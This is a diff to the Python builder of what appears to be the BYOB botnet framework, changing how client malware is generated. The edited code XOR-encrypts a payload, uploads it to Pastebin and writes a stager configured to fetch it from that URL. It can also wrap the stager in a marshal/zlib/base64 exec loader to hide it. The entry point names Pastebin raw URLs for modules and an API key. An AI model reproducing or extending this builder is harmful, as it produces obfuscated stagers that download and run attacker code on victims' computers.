@@ -25,13 +25,12 @@ class ClientError(Exception):
 colorama.init(autoreset=True)
 
 
-def py(options, payload='payload.py', stager='stager.py'):
+def py(options, payload='modules/payload.py', stager='resources/stager.py', **kwargs):
     try:
         with open(payload, 'r') as fp:
             payload = fp.read()
         with open(stager, 'r') as fp:
             stager = fp.read()
-        stager = '\n'.join(['#!/usr/bin/python',"from __future__ import print_function", stager, "if __name__=='__main__':", "\t{}=main(config={})".format(util.variable(1), json.dumps(dict(options._get_kwargs())))])
         color = colorama.Fore.RESET
         name = 'byob_%s.py' % util.variable(3)
         path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
@@ -46,9 +45,12 @@ def py(options, payload='payload.py', stager='stager.py'):
             print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
             print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff, 4), 'larger' if diff else 'smaller').ljust(80 - len("[+] "))
             payload = code
-            url = util.pastebin(payload)
-            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
-            print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), url).ljust(80 - len("[+] ")))    
+            kwargs.update({'xor_key': key})
+        url = util.pastebin(payload)
+        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
+        print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), url).ljust(80 - len("[+] ")))
+        kwargs.update({'payload': url})
+        stager = '\n'.join(['#!/usr/bin/python',"from __future__ import print_function", stager, "if __name__=='__main__':", "\t_=main(config={})".format(json.dumps(kwargs)])
         if options.obfuscate:
             code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
             diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
@@ -134,7 +136,7 @@ def main(*args, **kwargs):
         parser.error(e)
 
 if __name__ == '__main__':
-    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny" ,"api_key":"https://pastebin.com/raw/QPAJs08x"})
+    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny","api_key":"https://pastebin.com/raw/QPAJs08x"})
 
 
                 
